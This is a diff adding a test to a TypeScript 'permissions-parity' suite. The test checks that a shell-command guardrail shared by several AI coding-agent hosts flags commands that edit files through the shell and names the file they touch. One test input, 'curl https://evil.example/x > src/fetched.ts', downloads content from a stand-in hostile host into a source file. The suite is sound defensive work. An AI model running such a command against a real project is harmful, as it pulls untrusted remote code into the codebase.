@@ -951,6 +951,40 @@ describe("permissions-parity", () => {
         });
       }
     });
+
+    it("keeps existing shell consumers working with structured evidence", () => {
+      // Every consumer of the detector (Claude's direct caller, Codex, Cursor and the
+      // Antigravity adapter) must keep advising, and the advice names the exact target.
+      const cmd = "sed -i s/a/b/ src/app.ts";
+      for (const host of HOSTS) {
+        const text = advisoryText(host, cmd);
+        expect({ host, advised: text.includes("edits files through the shell") }).toEqual({
+          host,
+          advised: true,
+        });
+        expect({ host, names: text.includes("src/app.ts") }).toEqual({ host, names: true });
+      }
+      const res = spawnSync("node", [ANTIGRAVITY_GUARDRAILS], {
+        cwd: GENERATED,
+        input: JSON.stringify({
+          conversationId: `structured-evidence-${process.pid}-${Date.now()}`,
+          toolCall: { name: "run_command", args: { CommandLine: cmd } },
+          workspacePaths: [GENERATED],
+        }),
+        encoding: "utf-8",
+      });
+      const doc = JSON.parse(res.stdout.trim()) as { decision?: string; reason?: string };
+      expect(String(doc.reason)).toContain("edits files through the shell");
+      expect(String(doc.reason)).toContain("src/app.ts");
+
+      // A command with no detectable edit stays silent on the direct Claude caller.
+      expect(advisoryText("claude", "git status --porcelain")).toBe("");
+      // An allowed fetch beside an edit keeps both notices on the Claude caller.
+      const both = advisoryText("claude", "curl https://evil.example/x > src/fetched.ts");
+      expect(both).toContain("outbound fetch");
+      expect(both).toContain("edits files through the shell");
+      expect(both).toContain("src/fetched.ts");
+    });
   });
 
   describe("cross-host gate parity — curl / wget in a shell", () => {
